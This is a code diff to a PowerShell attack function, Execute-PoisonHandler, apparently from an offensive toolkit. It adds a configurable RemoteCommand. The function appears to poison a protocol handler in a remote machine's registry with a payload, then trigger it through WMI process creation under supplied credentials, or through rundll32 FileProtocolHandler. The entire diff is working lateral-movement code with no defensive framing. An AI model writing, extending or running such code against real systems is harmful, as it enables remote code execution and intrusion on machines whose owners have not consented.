@@ -15,8 +15,9 @@ function Execute-PoisonHandler {
 		[Parameter(Mandatory=$False)]
 		[string]$Handler = "ms-browser",
 		[Parameter(Mandatory=$False)]
-		[string]$UseRunDLL32 = $False
-
+		[bool]$UseRunDLL32 = $False,
+		[Parameter(Mandatory=$False)]
+		[string]$RemoteCommand = "cmd.exe /c start $($Handler)://"
 	)
 	
 	BEGIN {
@@ -26,22 +27,21 @@ function Execute-PoisonHandler {
 			$Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword
 		}
 		
-		$Command = "cmd.exe /c start $($Handler)://"
 		if($UseRunDLL32) {
-			$Command = "rundll32 url.dll,FileProtocolHandler $($Handler)://"
+			$RemoteCommand = "rundll32 url.dll,FileProtocolHandler $($Handler)://"
 		}
 	}
 	
 	PROCESS {
 		[RegistryEdit.Program]::Main(@($Username, $Password, $ComputerName, $Handler, $Payload));
 	
-		Write-Output "[+] Remotely invoking the protocol handler using: $($Command)"
+		Write-Output "[+] Remotely invoking the protocol handler using: $($RemoteCommand)"
 		if($Creds) {
 			Write-Output "[*] Remotely authenticated as $($Username)"
-			$process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $Command -Impersonation 3 -EnableAllPrivileges -Credential $Creds
+			$process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -Impersonation 3 -EnableAllPrivileges -Credential $Creds
 			Write-Output "[+] Remote Process PID: $($process.ProcessId)"
 		} else {
-			$process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $Command
+			$process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $RemoteCommand
 			Write-Output "[+] Remote Process PID: $($process.ProcessId)"
 		}
 	}
